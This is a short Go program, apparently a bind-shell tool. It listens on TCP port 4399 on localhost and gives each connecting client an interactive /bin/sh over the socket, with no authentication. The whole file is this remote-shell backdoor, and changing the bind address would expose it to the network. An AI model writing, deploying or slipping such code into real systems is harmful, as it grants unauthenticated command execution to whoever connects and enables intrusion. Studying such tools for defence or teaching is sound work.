package main

import (
	"io"
	"log"
	"net"
	"os/exec"
)

func main() {
	listener, err := net.Listen("tcp", "127.0.0.1:4399")
	if err != nil {
		log.Fatalln("bind error ", err)
	}
	for {
		conn, err := listener.Accept()
		if err != nil {
			log.Fatalln("accpect error ", err)
		}
		go handle(conn)
	}
}

func handle(conn net.Conn) {
	log.Println("[DEBUG]user connected")
	cmd := exec.Command("/bin/sh", "-i")
	readp, writep := io.Pipe()
	cmd.Stdin = conn
	cmd.Stdout = writep
	go io.Copy(conn, readp)
	if err := cmd.Run(); err != nil {
		log.Println("cmd error ", err)
	}
	conn.Close()
}
